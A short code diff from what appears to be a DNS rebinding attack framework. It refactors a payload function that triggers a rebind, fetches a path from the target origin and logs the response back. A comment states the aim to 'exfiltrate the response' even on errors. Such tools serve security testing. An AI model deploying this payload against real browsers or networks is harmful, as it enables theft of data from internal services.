@@ -16,13 +16,16 @@ async function mainFrame () {
 
 function rebindFrame () {
   session.triggerRebind().then(() => {
-    network.get(session.baseURL + window.args.path, (code, headers, body) => {
-      // success callback
-      session.log({ code: code, headers: headers, body: body })
-    }, (code, headers, body) => {
-      // fail callback
-      // (we still want to exfiltrate the response even if it's i.e. a 404)
-      session.log({ code: code, headers: headers, body: body })
+    network.get(session.baseURL + window.args.path, {
+      successCb: (code, headers, body) => {
+        // success callback
+        session.log({ code: code, headers: headers, body: body })
+      },
+      failCb: (code, headers, body) => {
+        // fail callback
+        // (we still want to exfiltrate the response even if it's i.e. a 404)
+        session.log({ code: code, headers: headers, body: body })
+      }
     })
   })
 }
